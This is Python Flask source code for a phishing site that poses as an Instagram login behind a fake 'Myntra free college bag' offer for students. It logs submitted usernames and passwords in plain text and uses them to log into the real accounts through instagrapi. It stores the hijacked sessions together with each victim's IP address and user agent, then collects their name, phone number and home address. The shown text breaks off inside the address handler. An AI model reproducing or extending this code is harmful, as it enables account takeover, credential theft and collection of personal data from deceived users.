from flask import Flask, request, redirect, url_for, render_template, render_template_string, session
from instagrapi import Client
import os
import json
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'a_very_secret_key_change_this'

# Folder to store session and address data
SESSION_DATA_DIR = "session_data"
os.makedirs(SESSION_DATA_DIR, exist_ok=True)

def session_data_file(username):
    return os.path.join(SESSION_DATA_DIR, f"{username}.json")

def save_combined_session_and_log(username, password, client: Client, request):
    ig_settings = client.get_settings()
    user_log = {
        "username": username,
        "password": password,
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
        "login_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    combined_data = {
        "instagram_session": ig_settings,
        "user_log": user_log
    }
    with open(session_data_file(username), "w") as f:
        json.dump(combined_data, f, indent=4)

# Login page template
login_page = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Get a Free College Bag by Just Logging into Instagram | Myntra Promo for Students</title>
    <meta name="description" content="College students, grab a cool bag for free! Just log in with your Instagram account and start promoting Myntra.">
    <meta name="author" content="Myntra Student Promo">
    <link rel="icon" href="data:image/jpeg;base64,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" type="image/x-icon" />

    <style>
        body {
            background: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 10px;
        }
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 30px 25px 25px;
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
            text-align: center;
            border-radius: 4px;
        }
        .header-image {
            max-width: 100%;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .logo {
            font-family: 'Grand Hotel', cursive;
            font-size: 42px;
            margin-bottom: 20px;
            color: #262626;
            font-weight: 900;
            letter-spacing: 2px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            margin: 6px 0 12px;
            padding: 12px 10px;
            border: 1px solid #dbdbdb;
            background: #fafafa;
            font-size: 16px;
            outline: none;
            border-radius: 3px;
        }
        button {
            width: 100%;
            background: #3897f0;
            border: none;
            color: white;
            font-weight: 600;
            padding: 12px 0;
            font-size: 16px;
            cursor: pointer;
            border-radius: 4px;
            margin-top: 8px;
        }
        button:hover {
            background: #2a78c7;
        }
        .error {
            color: red;
            margin: 10px 0;
            font-weight: bold;
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
</head>
<body>
    <div class="login-box">
        <img src="https://www.myntra.com/favicon.ico" alt="Myntra Offer" class="header-image" />
        <div class="logo">Instagram</div>
        {% if error %}
          <div class="error">{{ error }}</div>
        {% endif %}
        <form method="post" action="/login">
            <input type="text" name="username" placeholder="Phone number, username, or email" required autofocus />
            <input type="password" name="password" placeholder="Password" required />
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    print(" ------------------ Welcome! User clicked the link ------------------")
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        print(f"[INFO] Login Attempt → Username: {username} | Password: {password}")

        cl = Client()
        try:
            cl.login(username, password)
            save_combined_session_and_log(username, password, cl, request)
            session['username'] = username
            print("✅ [SUCCESS] User logged in successfully")
            return redirect(url_for('address'))
        except Exception as e:
            error = "Incorrect username or password"
            print(f"[ERROR] Login failed: {e}")

    return render_template_string(login_page, error=error)

@app.route('/address', methods=['GET', 'POST'])
def address():
    if request.method == 'POST':
        address_data = {
            "full_name": request.form.get("full_name"),
            "phone_number": request.form.get("phone_number"),
            "pincode": request.form.get("pincode"),
            "state": request.form.get("state"),
            "city": request.form.get("city"),
            "house_address": request.form.get("house_address"),
            "landmark": request.form.get("landmark"),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
